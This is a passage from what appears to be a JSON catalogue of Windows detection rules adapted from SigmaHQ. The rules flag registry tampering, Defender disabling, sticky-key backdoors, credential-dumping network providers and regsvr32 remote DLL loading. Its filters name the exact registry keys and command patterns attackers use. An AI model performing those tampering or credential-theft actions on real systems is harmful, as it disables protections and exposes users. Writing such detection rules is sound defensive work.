"scenarios/sigmahq/proc_creation_win_reg_rdp_keys_tamper.yml", "version": "0.2", "versions": {"0.1": {"digest": "83743dce8cc7e670f9ff19cc96217c69669dc2c747244deb23e69f9d250a4d4f"}, "0.2": {"digest": "ede6272dc1142e49147b7a4b56d79461e4da38a7b0af5a51bed97321e1ad49e7"}}}, "sigmahq/proc_creation_win_reg_susp_paths": {"content": "type: trigger\nname: sigmahq/proc_creation_win_reg_susp_paths\ndescription: |\n  Detects when an adversary uses the reg.exe utility to add or modify new keys or subkeys\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\reg.exe' || evt.Parsed.OriginalFileName == 'reg.exe') && (evt.Parsed.CommandLine contains '\\\\AppDataLow\\\\Software\\\\Microsoft\\\\' || evt.Parsed.CommandLine contains '\\\\Policies\\\\Microsoft\\\\Windows\\\\OOBE' || evt.Parsed.CommandLine contains '\\\\Policies\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon' || evt.Parsed.CommandLine contains '\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\Currentversion\\\\Winlogon' || evt.Parsed.CommandLine contains '\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\WDigest' || evt.Parsed.CommandLine contains '\\\\Microsoft\\\\Windows Defender\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1112\n   - attack.t1562.001\n\n  label: \"Reg Add Suspicious Paths\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects when an adversary uses the reg.exe utility to add or modify new keys or subkeys\n", "path": "scenarios/sigmahq/proc_creation_win_reg_susp_paths.yml", "version": "0.2", "versions": {"0.1": {"digest": "d82525af53ba7034c637f7823303ddb3adcf593a5f3b1818e04aa65780736bd8"}, "0.2": {"digest": "442ffc61e0b3f1c89bae98283c3b98b78e2f6db10752a57840272b3296784319"}}}, "sigmahq/proc_creation_win_reg_volsnap_disable": {"content": "type: trigger\nname: sigmahq/proc_creation_win_reg_volsnap_disable\ndescription: |\n  Detects commands that temporarily turn off Volume Snapshots\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '\\\\Services\\\\VSS\\\\Diag' && evt.Parsed.CommandLine contains '/d Disabled')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.001\n\n  label: \"Disabled Volume Snapshots\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects commands that temporarily turn off Volume Snapshots\n", "path": "scenarios/sigmahq/proc_creation_win_reg_volsnap_disable.yml", "version": "0.2", "versions": {"0.1": {"digest": "d15de20552f34fb5d33169b4eca1a2c5b3609c5aaf8719189638ba3718a7b4f7"}, "0.2": {"digest": "42e5712b212126ac1af78a5945640234d57b4561bdc59280463958ad070a7c92"}}}, "sigmahq/proc_creation_win_reg_windows_defender_tamper": {"content": "type: trigger\nname: sigmahq/proc_creation_win_reg_windows_defender_tamper\ndescription: |\n  Detects the usage of \"reg.exe\" to tamper with different Windows Defender registry keys in order to disable some important features related to protection and detection\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\reg.exe' || evt.Parsed.OriginalFileName == 'reg.exe') && (evt.Parsed.CommandLine contains 'SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\' || evt.Parsed.CommandLine contains 'SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender Security Center' || evt.Parsed.CommandLine contains 'SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\') && (evt.Parsed.CommandLine contains ' add ' && evt.Parsed.CommandLine contains 'd 0' && (evt.Parsed.CommandLine contains 'DisallowExploitProtectionOverride' || evt.Parsed.CommandLine contains 'EnableControlledFolderAccess' || evt.Parsed.CommandLine contains 'MpEnablePus' || evt.Parsed.CommandLine contains 'PUAProtection' || evt.Parsed.CommandLine contains 'SpynetReporting' || evt.Parsed.CommandLine contains 'SubmitSamplesConsent' || evt.Parsed.CommandLine contains 'TamperProtection') || evt.Parsed.CommandLine contains ' add ' && evt.Parsed.CommandLine contains 'd 1' && (evt.Parsed.CommandLine contains 'DisableAntiSpyware' || evt.Parsed.CommandLine contains 'DisableAntiSpywareRealtimeProtection' || evt.Parsed.CommandLine contains 'DisableAntiVirus' || evt.Parsed.CommandLine contains 'DisableArchiveScanning' || evt.Parsed.CommandLine contains 'DisableBehaviorMonitoring' || evt.Parsed.CommandLine contains 'DisableBlockAtFirstSeen' || evt.Parsed.CommandLine contains 'DisableConfig' || evt.Parsed.CommandLine contains 'DisableEnhancedNotifications' || evt.Parsed.CommandLine contains 'DisableIntrusionPreventionSystem' || evt.Parsed.CommandLine contains 'DisableIOAVProtection' || evt.Parsed.CommandLine contains 'DisableOnAccessProtection' || evt.Parsed.CommandLine contains 'DisablePrivacyMode' || evt.Parsed.CommandLine contains 'DisableRealtimeMonitoring' || evt.Parsed.CommandLine contains 'DisableRoutinelyTakingAction' || evt.Parsed.CommandLine contains 'DisableScanOnRealtimeEnable' || evt.Parsed.CommandLine contains 'DisableScriptScanning' || evt.Parsed.CommandLine contains 'Notification_Suppress' || evt.Parsed.CommandLine contains 'SignatureDisableUpdateOnStartupWithoutEngine')))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.001\n\n  label: \"Suspicious Windows Defender Registry Key Tampering Via Reg.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the usage of \"reg.exe\" to tamper with different Windows Defender registry keys in order to disable some important features related to protection and detection\n", "path": "scenarios/sigmahq/proc_creation_win_reg_windows_defender_tamper.yml", "version": "0.2", "versions": {"0.1": {"digest": "86311cb679c62610b70166a64e5f9ab7023d158646b7b1dd861dbf166b2856b6"}, "0.2": {"digest": "b2a4c2aa1331d35af9be9269986968ff5e881a0bbdb8cdffafe6803d6677d08a"}}}, "sigmahq/proc_creation_win_regedit_export_critical_keys": {"content": "type: trigger\nname: sigmahq/proc_creation_win_regedit_export_critical_keys\ndescription: |\n  Detects the export of a crital Registry key to a file.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\regedit.exe' || evt.Parsed.OriginalFileName == 'REGEDIT.EXE') && (evt.Parsed.CommandLine contains ' -E ' || evt.Parsed.CommandLine contains ' /E ' || evt.Parsed.CommandLine contains ' \u2013E ' || evt.Parsed.CommandLine contains ' \u2014E ' || evt.Parsed.CommandLine contains ' \u2015E ') && (evt.Parsed.CommandLine contains 'hklm' || evt.Parsed.CommandLine contains 'hkey_local_machine') && (evt.Parsed.CommandLine endsWith '\\\\system' || evt.Parsed.CommandLine endsWith '\\\\sam' || evt.Parsed.CommandLine endsWith '\\\\security'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1012\n\n  label: \"Exports Critical Registry Keys To a File\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the export of a crital Registry key to a file.\n", "path": "scenarios/sigmahq/proc_creation_win_regedit_export_critical_keys.yml", "version": "0.2", "versions": {"0.1": {"digest": "fe8a4de403337a8523956889cac3c34cc5d18256c48bef892d6402236b44a890"}, "0.2": {"digest": "9591ea19f709f8f95239a0582f45cfc5e34f9dd3bedb32b1119c52baaac309fc"}}}, "sigmahq/proc_creation_win_regedit_import_keys_ads": {"content": "type: trigger\nname: sigmahq/proc_creation_win_regedit_import_keys_ads\ndescription: |\n  Detects the import of a alternate datastream to the registry with regedit.exe.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\regedit.exe' || evt.Parsed.OriginalFileName == 'REGEDIT.EXE') && (evt.Parsed.CommandLine contains ' /i ' || evt.Parsed.CommandLine contains '.reg') && evt.Parsed.CommandLine matches ':[^ \\\\\\\\]' && not (evt.Parsed.CommandLine contains ' -e ' || evt.Parsed.CommandLine contains ' /e ' || evt.Parsed.CommandLine contains ' \u2013e ' || evt.Parsed.CommandLine contains ' \u2014e ' || evt.Parsed.CommandLine contains ' \u2015e ' || evt.Parsed.CommandLine contains ' -a ' || evt.Parsed.CommandLine contains ' /a ' || evt.Parsed.CommandLine contains ' \u2013a ' || evt.Parsed.CommandLine contains ' \u2014a ' || evt.Parsed.CommandLine contains ' \u2015a ' || evt.Parsed.CommandLine contains ' -c ' || evt.Parsed.CommandLine contains ' /c ' || evt.Parsed.CommandLine contains ' \u2013c ' || evt.Parsed.CommandLine contains ' \u2014c ' || evt.Parsed.CommandLine contains ' \u2015c '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1112\n\n  label: \"Imports Registry Key From an ADS\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the import of a alternate datastream to the registry with regedit.exe.\n", "path": "scenarios/sigmahq/proc_creation_win_regedit_import_keys_ads.yml", "version": "0.2", "versions": {"0.1": {"digest": "29fe3ad7a5b6722e6e5bf2bd19a040a696a1b8f4c50682a29a1d6795afc0d773"}, "0.2": {"digest": "28eee9787fac55f23cad03c7012b6f16f582ebb8cf88bb70d3f1a94ea42c8064"}}}, "sigmahq/proc_creation_win_regedit_trustedinstaller": {"content": "type: trigger\nname: sigmahq/proc_creation_win_regedit_trustedinstaller\ndescription: |\n  Detects a regedit started with TrustedInstaller privileges or by ProcessHacker.exe\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\regedit.exe' && (evt.Parsed.ParentImage endsWith '\\\\TrustedInstaller.exe' || evt.Parsed.ParentImage endsWith '\\\\ProcessHacker.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1548\n\n  label: \"Regedit as Trusted Installer\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a regedit started with TrustedInstaller privileges or by ProcessHacker.exe\n", "path": "scenarios/sigmahq/proc_creation_win_regedit_trustedinstaller.yml", "version": "0.2", "versions": {"0.1": {"digest": "1558aa2aa84a8af3b3cc5ca314d6f3489721aa853441a7bb2d2e5c0493fb8cb2"}, "0.2": {"digest": "df8185a8790a65a6d800f2fc62fc38c4547ecef4af25f376f1839f34eb5adfc0"}}}, "sigmahq/proc_creation_win_regini_ads": {"content": "type: trigger\nname: sigmahq/proc_creation_win_regini_ads\ndescription: |\n  Detects the import of an alternate data stream with regini.exe, regini.exe can be used to modify registry keys.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\regini.exe' || evt.Parsed.OriginalFileName == 'REGINI.EXE') && evt.Parsed.CommandLine matches ':[^ \\\\\\\\]')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1112\n\n  label: \"Suspicious Registry Modification From ADS Via Regini.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the import of an alternate data stream with regini.exe, regini.exe can be used to modify registry keys.\n", "path": "scenarios/sigmahq/proc_creation_win_regini_ads.yml", "version": "0.2", "versions": {"0.1": {"digest": "01fe9e02db3e1012eb5466c9694726e609acc3ea5d116b14ecd6a77813067b51"}, "0.2": {"digest": "534fa0badafc21bd628201b37bcfe04e7c5b3021cb36320c606f9ff64075e0b4"}}}, "sigmahq/proc_creation_win_registry_ie_security_zone_protocol_defaults_downgrade": {"content": "type: trigger\nname: sigmahq/proc_creation_win_registry_ie_security_zone_protocol_defaults_downgrade\ndescription: |\n  Detects changes to Internet Explorer's (IE / Windows Internet properties) ZoneMap configuration of the \"HTTP\" and \"HTTPS\" protocols to point to the \"My Computer\" zone. This allows downloaded files from the Internet to be granted the same level of trust as files stored locally. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\ProtocolDefaults' && evt.Parsed.CommandLine contains 'http' && evt.Parsed.CommandLine contains ' 0')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"IE ZoneMap Setting Downgraded To MyComputer Zone For HTTP Protocols Via CLI\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects changes to Internet Explorer's (IE / Windows Internet properties) ZoneMap configuration of the \"HTTP\" and \"HTTPS\" protocols to point to the \"My Computer\" zone. This allows downloaded files from the Internet to be granted the same level of trust as files stored locally. \n", "path": "scenarios/sigmahq/proc_creation_win_registry_ie_security_zone_protocol_defaults_downgrade.yml", "version": "0.2", "versions": {"0.1": {"digest": "f4794d4d3853026df354e931684f816db76f8e66f6c391bc4d2930adb5a98dd9"}, "0.2": {"digest": "2286c1a37e740749cd406d2a07d905c91d8919a54a91067777f9b09d690a0161"}}}, "sigmahq/proc_creation_win_registry_install_reg_debugger_backdoor": {"content": "type: trigger\nname: sigmahq/proc_creation_win_registry_install_reg_debugger_backdoor\ndescription: |\n  Detects the registration of a debugger for a program that is available in the logon screen (sticky key backdoor).\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '\\\\CurrentVersion\\\\Image File Execution Options\\\\' && (evt.Parsed.CommandLine contains 'sethc.exe' || evt.Parsed.CommandLine contains 'utilman.exe' || evt.Parsed.CommandLine contains 'osk.exe' || evt.Parsed.CommandLine contains 'magnify.exe' || evt.Parsed.CommandLine contains 'narrator.exe' || evt.Parsed.CommandLine contains 'displayswitch.exe' || evt.Parsed.CommandLine contains 'atbroker.exe' || evt.Parsed.CommandLine contains 'HelpPane.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1546.008\n\n  label: \"Suspicious Debugger Registration Cmdline\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the registration of a debugger for a program that is available in the logon screen (sticky key backdoor).\n", "path": "scenarios/sigmahq/proc_creation_win_registry_install_reg_debugger_backdoor.yml", "version": "0.2", "versions": {"0.1": {"digest": "61215884242616a8b4c6839d621ae50577cc15fa2e4eab1fdd2a244484db9e7f"}, "0.2": {"digest": "b22f4730c53cb7b9c4ec22755b349ee3ddf1a436e978656d59e71c797161190b"}}}, "sigmahq/proc_creation_win_registry_logon_script": {"content": "type: trigger\nname: sigmahq/proc_creation_win_registry_logon_script\ndescription: |\n  Detects the addition of a new LogonScript to the registry value \"UserInitMprLogonScript\" for potential persistence\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'UserInitMprLogonScript')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1037.001\n\n  label: \"Potential Persistence Via Logon Scripts - CommandLine\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the addition of a new LogonScript to the registry value \"UserInitMprLogonScript\" for potential persistence\n", "path": "scenarios/sigmahq/proc_creation_win_registry_logon_script.yml", "version": "0.2", "versions": {"0.1": {"digest": "ee96066154ad813023bdb2e6f4f109d4b4f0f1d7a71506a4256cd1bd2f97e163"}, "0.2": {"digest": "29faeb1d3117b2bd1c0ad8bd74c71cd9ec72e2b6150773de0d4cfb1a50635468"}}}, "sigmahq/proc_creation_win_registry_new_network_provider": {"content": "type: trigger\nname: sigmahq/proc_creation_win_registry_new_network_provider\ndescription: |\n  Detects when an attacker tries to add a new network provider in order to dump clear text credentials, similar to how the NPPSpy tool does it\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '\\\\System\\\\CurrentControlSet\\\\Services\\\\' && evt.Parsed.CommandLine contains '\\\\NetworkProvider')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003\n\n  label: \"Potential Credential Dumping Attempt Using New NetworkProvider - CLI\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects when an attacker tries to add a new network provider in order to dump clear text credentials, similar to how the NPPSpy tool does it\n", "path": "scenarios/sigmahq/proc_creation_win_registry_new_network_provider.yml", "version": "0.2", "versions": {"0.1": {"digest": "6f3272d83c6f29c71190b7f975ba77b93711fbd5257e704bd393a9089844a1ed"}, "0.2": {"digest": "16a36baf6699d2698e3741e693d4a6bc377f61384d88011b17d0dd8897170264"}}}, "sigmahq/proc_creation_win_registry_office_disable_python_security_warnings": {"content": "type: trigger\nname: sigmahq/proc_creation_win_registry_office_disable_python_security_warnings\ndescription: |\n  Detects changes to the registry value \"PythonFunctionWarnings\" that would prevent any warnings or alerts from showing when Python functions are about to be executed. Threat actors could run malicious code through the new Microsoft Excel feature that allows Python to run within the spreadsheet. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '\\\\Microsoft\\\\Office\\\\' && evt.Parsed.CommandLine contains '\\\\Excel\\\\Security' && evt.Parsed.CommandLine contains 'PythonFunctionWarnings' && evt.Parsed.CommandLine contains ' 0')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.001\n\n  label: \"Python Function Execution Security Warning Disabled In Excel\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects changes to the registry value \"PythonFunctionWarnings\" that would prevent any warnings or alerts from showing when Python functions are about to be executed. Threat actors could run malicious code through the new Microsoft Excel feature that allows Python to run within the spreadsheet. \n", "path": "scenarios/sigmahq/proc_creation_win_registry_office_disable_python_security_warnings.yml", "version": "0.2", "versions": {"0.1": {"digest": "ee8e00ec8c52a99569545c1319fb217681d7e1cf8b291ee0d73916bf54d12aed"}, "0.2": {"digest": "0d86f9c29d02e4ce1daf74a4bac51807da1cb8131c988a800c38b4e581ad0170"}}}, "sigmahq/proc_creation_win_registry_privilege_escalation_via_service_key": {"content": "type: trigger\nname: sigmahq/proc_creation_win_registry_privilege_escalation_via_service_key\ndescription: |\n  Detect modification of services configuration (ImagePath, FailureCommand and ServiceDLL) in registry by processes with Medium integrity level\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.IntegrityLevel == 'Medium' && evt.Parsed.CommandLine contains 'ControlSet' && evt.Parsed.CommandLine contains 'services' && (evt.Parsed.CommandLine contains '\\\\ImagePath' || evt.Parsed.CommandLine contains '\\\\FailureCommand' || evt.Parsed.CommandLine contains '\\\\ServiceDll'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1574.011\n\n  label: \"Potential Privilege Escalation via Service Permissions Weakness\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detect modification of services configuration (ImagePath, FailureCommand and ServiceDLL) in registry by processes with Medium integrity level\n", "path": "scenarios/sigmahq/proc_creation_win_registry_privilege_escalation_via_service_key.yml", "version": "0.2", "versions": {"0.1": {"digest": "f7b3a1c7fe65810855c7aea41703d6096fd3d905685ae7a8bebf6bfc8de75c18"}, "0.2": {"digest": "3805dc9aab13ebaa32e03bf38586cc5e5801ce39ae8ebf00627ea2a416a35451"}}}, "sigmahq/proc_creation_win_registry_provlaunch_provisioning_command": {"content": "type: trigger\nname: sigmahq/proc_creation_win_registry_provlaunch_provisioning_command\ndescription: |\n  Detects potential abuse of the provisioning registry key for indirect command execution through \"Provlaunch.exe\".\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'SOFTWARE\\\\Microsoft\\\\Provisioning\\\\Commands\\\\')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218\n\n  label: \"Potential Provisioning Registry Key Abuse For Binary Proxy Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects potential abuse of the provisioning registry key for indirect command execution through \"Provlaunch.exe\".\n", "path": "scenarios/sigmahq/proc_creation_win_registry_provlaunch_provisioning_command.yml", "version": "0.2", "versions": {"0.1": {"digest": "e3360c918cc6b7b1e78a634fd182ed7709f223b4e120c88117ae6a255652e378"}, "0.2": {"digest": "d475ad849cd074e1f34f72f1b3eb11514cc12a1c9d20467a294b2de8228f4714"}}}, "sigmahq/proc_creation_win_registry_set_unsecure_powershell_policy": {"content": "type: trigger\nname: sigmahq/proc_creation_win_registry_set_unsecure_powershell_policy\ndescription: |\n  Detects changes to the PowerShell execution policy registry key in order to bypass signing requirements for script execution from the CommandLine\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine contains '\\\\ShellIds\\\\Microsoft.PowerShell\\\\ExecutionPolicy' || evt.Parsed.CommandLine contains '\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\ExecutionPolicy') && (evt.Parsed.CommandLine contains 'Bypass' || evt.Parsed.CommandLine contains 'RemoteSigned' || evt.Parsed.CommandLine contains 'Unrestricted'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Potential PowerShell Execution Policy Tampering - ProcCreation\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects changes to the PowerShell execution policy registry key in order to bypass signing requirements for script execution from the CommandLine\n", "path": "scenarios/sigmahq/proc_creation_win_registry_set_unsecure_powershell_policy.yml", "version": "0.2", "versions": {"0.1": {"digest": "2b9fd18cad3e9da23b24e06c861da04b567c4bfe306cd197b69df323eaae0ff5"}, "0.2": {"digest": "3ea67a38b55dc3dc9335e602254d3c3fc05c1661bc4aaf6387eb97dc9d62e962"}}}, "sigmahq/proc_creation_win_regsvr32_http_ip_pattern": {"content": "type: trigger\nname: sigmahq/proc_creation_win_regsvr32_http_ip_pattern\ndescription: |\n  Detects regsvr32 execution to download and install DLLs located remotely where the address is an IP address.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\regsvr32.exe' || evt.Parsed.OriginalFileName == 'REGSVR32.EXE') && (evt.Parsed.CommandLine contains ' /i:http://1' || evt.Parsed.CommandLine contains ' /i:http://2' || evt.Parsed.CommandLine contains ' /i:http://3' || evt.Parsed.CommandLine contains ' /i:http://4' || evt.Parsed.CommandLine contains ' /i:http://5' || evt.Parsed.CommandLine contains ' /i:http://6' || evt.Parsed.CommandLine contains ' /i:http://7' || evt.Parsed.CommandLine contains ' /i:http://8' || evt.Parsed.CommandLine contains ' /i:http://9' || evt.Parsed.CommandLine contains ' /i:https://1' || evt.Parsed.CommandLine contains ' /i:https://2' || evt.Parsed.CommandLine contains ' /i:https://3' || evt.Parsed.CommandLine contains ' /i:https://4' || evt.Parsed.CommandLine contains ' /i:https://5' || evt.Parsed.CommandLine contains ' /i:https://6' || evt.Parsed.CommandLine contains ' /i:https://7' || evt.Parsed.CommandLine contains ' /i:https://8' || evt.Parsed.CommandLine contains ' /i:https://9' || evt.Parsed.CommandLine contains ' -i:http://1' || evt.Parsed.CommandLine contains ' -i:http://2' || evt.Parsed.CommandLine contains ' -i:http://3' || evt.Parsed.CommandLine contains ' -i:http://4' || evt.Parsed.CommandLine contains ' -i:http://5' || evt.Parsed.CommandLine contains ' -i:http://6' || evt.Parsed.CommandLine contains ' -i:http://7' || evt.Parsed.CommandLine contains ' -i:http://8' || evt.Parsed.CommandLine contains ' -i:http://9' || evt.Parsed.CommandLine contains ' -i:https://1' || evt.Parsed.CommandLine contains ' -i:https://2' || evt.Parsed.CommandLine contains ' -i:https://3' || evt.Parsed.CommandLine contains ' -i:https://4' || evt.Parsed.CommandLine contains ' -i:https://5' || evt.Parsed.CommandLine contains ' -i:https://6' || evt.Parsed.CommandLine contains ' -i:https://7' || evt.Parsed.CommandLine contains ' -i:https://8' || evt.Parsed.CommandLine contains ' -i:https://9'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218.010\n\n  label: \"Potentially Suspicious Regsvr32 HTTP IP Pattern\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects regsvr32 execution to download and install DLLs located remotely where the address is an IP address.\n", "path": "scenarios/sigmahq/proc_creation_win_regsvr32_http_ip_pattern.yml", "version": "0.2", "versions": {"0.1": {"digest": "f40744f82147894e30674d12a25d3a35263e2b3e2b12ab1326716a95fecaba37"}, "0.2": {"digest": "01db7559cc51b21e34e7f605045ff7003c9e41396abbdf582b9c037070a4d2cf"}}}, "sigmahq/proc_creation_win_regsvr32_remote_share": {"content": "type: trigger\nname: sigmahq/proc_creation_win_regsvr32_remote_share\ndescription: |\n  Detects REGSVR32.exe to execute DLL hosted on remote shares\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\regsvr32.exe' || evt.Parsed.OriginalFileName == '\\\\REGSVR32.EXE') && evt.Parsed.CommandLine contains ' \\\\\\\\')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218.010\n\n  label: \"Suspicious Regsvr32 Execution From Remote Share\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects REGSVR32.exe to execute DLL hosted on remote shares\n", "path": "scenarios/sigmahq/proc_creation_win_regsvr32_remote_share.yml", "version": "0.2", "versions": {"0.1": {"digest": "999b780fce6724e18d6d4a1fdda1646535391ea38550e1e7626146f58b121f79"}, "0.2": {"digest": "8b2cd3b645abeb21968757ca3a8fe7dcd7603eeb1062cd9ae041a8e6b6f664ab"}}}, "sigmahq/proc_creation_win_regsvr32_susp_child_process": {"content": "type: trigger\nname: sigmahq/proc_creation_win_regsvr32_susp_child_process\ndescription: |\n  Detects potentially suspicious child processes of \"regsvr32.exe\".\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\regsvr32.exe' && (evt.Parsed.Image endsWith '\\\\calc.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith '\\\\explorer.exe' || evt.Parsed.Image endsWith '\\\\mshta.exe' || evt.Parsed.Image endsWith '\\\\net.exe' || evt.Parsed.Image endsWith '\\\\net1.exe' || evt.Parsed.Image endsWith '\\\\nltest.exe' || evt.Parsed.Image endsWith '\\\\notepad.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\reg.exe' || evt.Parsed.Image endsWith '\\\\schtasks.exe' || evt.Parsed.Image endsWith '\\\\werfault.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe') && not (evt.Parsed.Image endsWith '\\\\werfault.exe' && evt.Parsed.CommandLine contains ' -u -p '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218.010\n\n  label: \"Potentially Suspicious Child Process Of Regsvr32\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects potentially suspicious child processes of \"regsvr32.exe\".\n", "path": "scenarios/sigmahq/proc_creation_win_regsvr32_susp_child_process.yml", "version": "0.2", "versions": {"0.1": {"digest": "26587875d622ffd4bee376e928261c2b534b781b242856d27dbd2caf0e844335"}, "0.2": {"digest": "6f290387d5b212c080bb03d4b623f6e41fbe0dad8e97969e091e61799581a4fe"}}}, "sigmahq/proc_creation_win_regsvr32_susp_exec_path_2": {"content": "type: trigger\nname: 